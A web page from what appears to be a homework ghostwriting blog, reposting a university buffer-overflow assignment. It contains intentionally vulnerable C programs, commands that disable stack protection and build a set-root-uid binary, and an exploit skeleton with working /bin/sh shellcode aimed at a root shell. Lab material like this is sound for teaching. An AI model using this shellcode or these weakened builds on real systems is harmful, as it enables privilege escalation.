@@ -1,0 +1,925 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="C代写：CMSC414 Buffer Overflows Part2, 留学生CS|辅导|代写">
+    <meta name="description" content="通过更多的例子，来练习缓冲区漏洞的利用。  
+A Vulnerable ProgramIn the remainder of the tasks, you will be exploiting a program that has abuf">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>C代写：CMSC414 Buffer Overflows Part2 | 留学生CS|辅导|代写</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+    
+
+
+    <!-- bg-cover style     -->
+
+
+
+<link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+<link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+<link rel="stylesheet" type="text/css" href="/css/matery.css">
+<link rel="stylesheet" type="text/css" href="/css/my.css">
+<link rel="stylesheet" type="text/css" href="/css/dark.css" media="none" onload="if(media!='all')media='all'">
+
+
+
+
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+    <link rel="stylesheet" href="/css/post.css">
+
+
+
+
+    
+        <link rel="stylesheet" type="text/css" href="/css/reward.css">
+    
+
+
+
+    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>
+
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">留学生CS|辅导|代写</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>辅导案例集合</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/comment" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>用户评价</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>联系我</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+  <li>
+    <a href="javascript:;" class="waves-effect waves-light" onclick="switchNightMode()" title="深色/浅色模式" >
+      <i id="sum-moon-icon" class="fas fa-sun" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">留学生CS|辅导|代写</div>
+        <div class="logo-desc">
+            
+            Never really desperate, only the lost of the soul.
+            
+        </div>
+    </div>
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			辅导案例集合
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/comment" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			用户评价
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			联系我
+		</a>
+          
+        </li>
+        
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/4.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">C代写：CMSC414 Buffer Overflows Part2</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/C%E4%BB%A3%E5%86%99/">
+                                <span class="chip bg-color">C代写</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2019-12-02
+                </div>
+                
+
+                
+
+                
+
+                
+
+                
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <p>通过更多的例子，来练习缓冲区漏洞的利用。  </p>
+<h2 id="A-Vulnerable-Program"><a href="#A-Vulnerable-Program" class="headerlink" title="A Vulnerable Program"></a>A Vulnerable Program</h2><p>In the remainder of the tasks, you will be exploiting a program that has a<br>buffer overflow vulnerability. Unlike Task 0, you are not allowed to modify<br>the program itself; instead, you will be attacking it by cleverly constructing<br>malicious inputs to the program.<br>    &#x2F;* vulnerable1.c <em>&#x2F;<br>    &#x2F;</em> This program has a buffer overflow vulnerability. <em>&#x2F;<br>    &#x2F;</em> Our task is to exploit this vulnerability, not by<br>     * modifying this code, but by providing a cleverly<br>     * constructed input. *&#x2F;<br>    #include &lt;stdlib.h&gt;<br>    #include &lt;stdio.h&gt;<br>    #include &lt;string.h&gt;<br>    #define BUFFER_SIZE 512<br>    void greet(char <em>str)<br>    {<br>      char greeting[32] &#x3D; “Welcome “;<br>      &#x2F;</em> The following allows buffer overflow *&#x2F;<br>      strcat(greeting, str);<br>    }<br>    int main()<br>    {<br>      char str[BUFFER_SIZE];<br>      FILE *bf &#x3D; fopen(“badfile”, “r”);<br>      fread(str, sizeof(char), BUFFER_SIZE, bf);<br>      greet(str);<br>      printf(“Returned properly: attack failed\n”);<br>      return 1;<br>    }<br>—|—<br>The vulnerable program for Task 1, vulnerable1.c, is given above. To compile<br>it without the relevant compiler-provided defenses and to make the executable<br>set-root-uid, do the following:<br>    $ sudo gcc -fno-stack-protector -z execstack -m32 -g vulnerable.c -o vuln1<br>    $ sudo chmod 4755 vuln1<br>The above program has a buffer-overflow vulnerability in function bof(). The<br>program reads 512 bytes from a file named badfile and passes this input to<br>function bof(), which uses strcat() to store the input into buffer. But buffer<br>is only 32 bytes and strcat() does not check for buffer boundary. As if that<br>weren’t bad enough, the user input is concatenated onto the end of a string<br>that is already stored in buffer (“Welcome: “).<br>An attacker can exploit this buffer-overflow vulnerability and potentially<br>launch a shell. Moreover, because the program is a set-root-uid program<br>(compiled as root using sudo), the attacker may be able to get a root shell.<br>Doing so is your next task.</p>
+<h2 id="Task-1-Exploiting-the-Vulnerability"><a href="#Task-1-Exploiting-the-Vulnerability" class="headerlink" title="Task 1: Exploiting the Vulnerability"></a>Task 1: Exploiting the Vulnerability</h2><p>For this task:</p>
+<ul>
+<li>Disable address space randomization (section 2.2). </li>
+<li>Make &#x2F;bin&#x2F;zsh the default shell program (section 2.3). </li>
+<li>Compile the vulnerable program in 32-bit, without the stack protector, and with the stack set to executable (Section 5).<br>Write a program, exploit1.c, that prints an appropriate string to stdout (we<br>will redirect it to the file, badfile, that the vulnerable program is<br>expecting). It must put the following at appropriate places in the string it<br>outputs:</li>
+<li>Shellcode. </li>
+<li>NOP instructions (0x90): to increase the chance of a successful target address. </li>
+<li>The address in the stack to which control should go when bof() returns. Ideally the address of the shellcode or one of the NOPs on the NOP sled.<br>The program takes no command-line arguments. You can use the following<br>skeleton.<br>&#x2F;* exploit1.c <em>&#x2F;<br>&#x2F;</em> Outputs a string for code injection on vulnerable1.c <em>&#x2F;<br>#include &lt;stdio.h&gt;<br>#include &lt;string.h&gt;<br>#define BUFFER_SIZE 512<br>char shellcode[]&#x3D;<br>  “\x31\xc0”       &#x2F;</em> xorl   %eax,%eax   <em>&#x2F;<br>  “\x50”           &#x2F;</em> pushl  %eax        <em>&#x2F;<br>  “\x68””&#x2F;&#x2F;sh”     &#x2F;</em> pushl  $0x68732f2f <em>&#x2F;<br>  “\x68””&#x2F;bin”     &#x2F;</em> pushl  $0x6e69622f <em>&#x2F;<br>  “\x89\xe3”       &#x2F;</em> movl   %esp,%ebx   <em>&#x2F;<br>  “\x50”           &#x2F;</em> pushl  %eax        <em>&#x2F;<br>  “\x53”           &#x2F;</em> pushl  %ebx        <em>&#x2F;<br>  “\x89\xe1”       &#x2F;</em> movl   %esp,%ecx   <em>&#x2F;<br>  “\x99”           &#x2F;</em> cdql               <em>&#x2F;<br>  “\xb0\x0b”       &#x2F;</em> movb   $0x0b,%al   <em>&#x2F;<br>  “\xcd\x80”       &#x2F;</em> int    $0x80       <em>&#x2F;<br>;<br>int main() {<br>  char buffer[BUFFER_SIZE];<br>  &#x2F;</em> Initialize the buffer to all zeroes <em>&#x2F;<br>  memset(buffer, 0x0, BUFFER_SIZE);<br>  &#x2F;</em> TODO: Fill the buffer with appropriate contents <em>&#x2F;<br>  &#x2F;</em> Print out the contents of the attack buffer *&#x2F;<br>  fwrite(buffer, BUFFER_SIZE, 1, stdout);<br>  return 0;<br>}<br>—|—</li>
+</ul>
+<p>After you finish the above program, do the following in a non-root shell.<br>Compile the program in 32-bit mode (using the -m32 command-line argument to<br>gcc). Run your exploit code and pipe the output to the vulnerable program. If<br>your exploit is implemented correctly, when function bof returns it will<br>execute your shellcode, giving you a root shell. Here are the commands you<br>would issue, assuming that vuln1 has already been compiled (as in Section 5).<br>    $ gcc -m32 exploit1.c -o exploit1<br>    $ .&#x2F;exploit1 &gt; badfile<br>    $ .&#x2F;vuln1<br>    #                    &lt;—- Bingo! You’ve got a root shell!<br>That is considered success for this task!<br>As an aside, note that although you have obtained the “#” prompt, you are only<br>a set-root-uid process and not a real-root process; i.e., your effective user<br>id is root but your real user id is your original non-root id. You can check<br>this by typing the following:<br>    # id<br>    uid&#x3D;(500) euid&#x3D;0(root)<br>A real-root process is more powerful than a set-root process. In particular,<br>many commands behave differently when executed by a set-root-uid process than<br>by a real root process. If you want such commands to treat you as a real root,<br>simply call setuid(0) to set your real user id to root.</p>
+<h2 id="Task-2-Address-Randomization-Protection"><a href="#Task-2-Address-Randomization-Protection" class="headerlink" title="Task 2: Address-Randomization Protection"></a>Task 2: Address-Randomization Protection</h2><p>In this task, you will use all of the same settings as in Task 1, but you will<br>be turning address space layout randomization (ASLR) back on. This can be done<br>as follows:<br>    $ sudo &#x2F;sbin&#x2F;sysctl -w kernel.randomize_va_space&#x3D;2<br>Nonetheless, your program will have to work with 100% success rate on every<br>invocation of the now-randomized program! To this end, we will be using a<br>different vulnerable program:<br>    &#x2F;* vulnerable2.c <em>&#x2F;<br>    &#x2F;</em> This program also has a buffer overflow vulnerability.<br>     * Our task is to exploit this vulnerability, even when<br>     * ASLR is turned on. <em>&#x2F;<br>    #include &lt;stdlib.h&gt;<br>    #include &lt;stdio.h&gt;<br>    #include &lt;string.h&gt;<br>    void echo_info()<br>    {<br>      char age[32];<br>      char name[32];<br>      &#x2F;</em> These are pipes to allow for ‘communication’ between<br>       * vulnerable2 and exploit2; you can ignore them. *&#x2F;<br>      FILE *out &#x3D; fopen(“f0”, “w”);<br>      FILE <em>in &#x3D; fopen(“f1”, “r”);<br>      &#x2F;</em> Read in the user’s name <em>&#x2F;<br>      fscanf(in, “%s”, age);<br>      &#x2F;</em> Echo it right back to them <em>&#x2F;<br>      fprintf(out, age);<br>      fprintf(out, “\n”); &#x2F;</em> Possible format string vulnerability <em>&#x2F;<br>      fflush(out);<br>      &#x2F;</em> Read in the user’s name <em>&#x2F;<br>      fscanf(in, “%s”, name); &#x2F;</em> Possible buffer overflow *&#x2F;<br>    }<br>    int main()<br>    {<br>      echo_info();<br>      printf(“Returned properly: attack failed\n”);<br>      return 1;<br>    }<br>—|—<br>This program very simply reads in two strings - an “age” and a “name” - and<br>echoes those back to the user. As we have learned, gets(str) is considered a<br>harmful function because it will read characters from stdin until it reaches a<br>null-terminating character and store them into str, regardless of how large<br>str actually is. This is what will permit a buffer overflow.<br>But there is another vulnerability here: the programmer has used fprintf<br>without providing a format string as the first argument. Recall that such<br>format string vulnerabilities allow an attacker to provide inputs that will<br>reveal values on the stack. What inputs can you provide to fscanf(age) that<br>might help you infer how to correctly overflow the buffer with fscanf(name)?</p>
+<h2 id="Task-3-A-Secure-Program"><a href="#Task-3-A-Secure-Program" class="headerlink" title="Task 3: A Secure Program"></a>Task 3: A Secure Program</h2><p>The majority of the project thus far has dealt with attacking existing code.<br>In this task, you will write some secure code of your own. It is, at face<br>value, a simple program, so use this as an opportunity to pay close attention<br>to every line of your code to ensure that it is not vulnerable to any of the<br>attacks we’ve discussed.<br>Your task is to write two programs:</p>
+<ul>
+<li>task3&#x2F;substring.c <ul>
+<li>Reads from stdin </li>
+<li>Takes three inputs, each separated by one or more characters of whitespace: <ul>
+<li>The first is a string, str. This should be at most 32 characters long (not including the null terminating character). Any additional characters should be ignored. </li>
+<li>The second input is a number first. </li>
+<li>The third input is also a number, last. If not, then output the (exact) string “Invalid input” and quit. All additional inputs should be ignored.</li>
+</ul>
+</li>
+<li>If the above inputs are well formed, the program then creates a file named output.txt if a file by that name already exists or if the program is unable to create that file, it should fail gracefully by printing out the (exact) string “Unable to open file”. </li>
+<li>Prints to output.txt the substring str[first:last], that is, the string comprising characters str[first] up to and including str[last], where the indices are zero- based. For example, if the inputs provided were str &#x3D; “concatenation”, first &#x3D; 3, and last &#x3D; 5, then the program should store “cat” to output.txt.</li>
+</ul>
+</li>
+<li>task3&#x2F;read.c <ul>
+<li>Reads from output.txt if it exists and can be opened (prints out “Unable to open file” if not). </li>
+<li>Prints to stdout what was stored via the other executable. output.txt should have no more than 32 characters (not including the null terminating character), and should have no spaces (recall that the input string was read up to but not including spaces).<br>Both of these will be compiled without ASLR and without stack protector (as<br>with Task 1). Also, while the above describes how many characters “should” be<br>in the input, there is no guarantee they will be. If you happen to require any<br>other files (e.g., header files), include them in task3&#x2F; as well. This<br>directory must be self-contained. Do not put any personally identifying<br>information in any of the files in task3&#x2F; (user name, user ID, or anything<br>else that will identify who you are).</li>
+</ul>
+</li>
+</ul>
+<h2 id="Task-4-Security-Review"><a href="#Task-4-Security-Review" class="headerlink" title="Task 4: Security Review"></a>Task 4: Security Review</h2><p>Throughout this course (and certainly in projects such as these), you will be<br>learning and gaining experience with the technical details of secure<br>programming, protocols, and networking. You should, in other words, develop<br>the skills to be able to analyze a system, identify its vulnerabilities, and<br>design defenses against them.<br>One of the broader goals of this course is to also guide you in developing a<br>“security mindset.” To give an example, imagine you saw an ad for a new car<br>that would unlock its doors if you bumped your phone against it. If you are in<br>the security mindset, your first thought might be “how could I use that to<br>gain entry into someone else’s car?” (And if you have really developed that<br>mindset, you might already be thinking “I’d do so by…”)<br>This is, frankly, not a natural way of viewing the world. It’s about thinking<br>like an adversary: an immensely important ability when designing and<br>evaluating (and breaking) secure systems.</p>
+<h3 id="The-task"><a href="#The-task" class="headerlink" title="The task"></a>The task</h3><p>Your task is to write a security analysis. With the intent of creating an<br>interesting, open forum to discuss these ideas, you will post your review on<br>the course Piazza forum (there’s a link on the course website). A post will be<br>created by the instructor: post your reply there (I can’t promise I’ll see it<br>otherwise). You cannot post a review of a system that has been covered before<br>your post, so get started early! Here’s what your security review should<br>include:</p>
+<ol>
+<li>A summary of the technology (one concise paragraph). It can be a specific product&#x2F;technology, or a class of them. This is where you would also state any assumptions you need to make about the product, if necessary. </li>
+<li>Three assets (1-3 sentences each)that which a defender would wish to protect and that an attacker would wish to steal&#x2F;compromise&#x2F;break, etc. Include the assets’ relevant security goals (confidentiality, availability, etc.), and to whom they pertain (are they the assets for the citizens of a country, the individual user, or perhaps the company deploying the particular technology?). </li>
+<li>At least two (and at most four) possible security threats (one or two sentences each). Recall that a threat is a potential action an adversary could take against one or more of the assets. Identify who the adversary may be. </li>
+<li>At possible defenses to the potential threats you identified (one or two sentences each). These could include techniques the system may already be applying. </li>
+<li>A discussion of the risks involved (one or two sentences). How serious would these attacks be, and what would be the potential fallout; are the main risks economical, violations of privacy, safety, or something else? </li>
+<li>Finally, conclude (one or two sentences) with a bigger picture reflections on the various points you make above. For instance: Do you think this is a fundamental flaw of all such pieces of technology to come, will the field come to address such challenges, and so on.</li>
+</ol>
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">SafePoker</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="http://saferman.github.io/2019/12/02/C%E4%BB%A3%E5%86%99%EF%BC%9ACMSC414BufferOverflowsPart2/">http://saferman.github.io/2019/12/02/C%E4%BB%A3%E5%86%99%EF%BC%9ACMSC414BufferOverflowsPart2/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">SafePoker</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/C%E4%BB%A3%E5%86%99/">
+                                    <span class="chip bg-color">C代写</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+                <div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fas fa-times"></i></a>
+            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s12 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="wechat">
+                        <img src="/medias/newqrcode.jpg" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/2019/12/09/Python%E4%BB%A3%E5%86%99%EF%BC%9ACS106XMLandTextComparison/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/23.jpg" class="responsive-img" alt="Python代写：CS106 XML and Text Comparison">
+                        
+                        <span class="card-title">Python代写：CS106 XML and Text Comparison</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2019-12-09
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            SafePoker
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/Python%E4%BB%A3%E5%86%99/">
+                        <span class="chip bg-color">Python代写</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2019/12/01/Python%E4%BB%A3%E5%86%99%EF%BC%9ACSC108HSocialNetwork/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/9.jpg" class="responsive-img" alt="Python代写：CSC108H Social Network">
+                        
+                        <span class="card-title">Python代写：CSC108H Social Network</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2019-12-01
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            SafePoker
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/Python%E4%BB%A3%E5%86%99/">
+                        <span class="chip bg-color">Python代写</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+
+    <div class="container row center-align"
+         style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2018-2024</span>
+            
+            <a href="/contact" target="_blank">SafePoker</a>
+            
+            <br>
+            
+            
+            
+                
+            
+            
+                <span id="busuanzi_container_site_pv">
+                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
+                    <span id="busuanzi_value_site_pv" class="white-color"></span>
+            </span>
+            
+            
+                <span id="busuanzi_container_site_uv">
+                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
+                    <span id="busuanzi_value_site_uv" class="white-color"></span>
+            </span>
+            
+            <br>
+
+            <!-- 运行天数提醒. -->
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+
+
+    <a href="mailto:hhh@gmail.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+
+
+
+
+
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
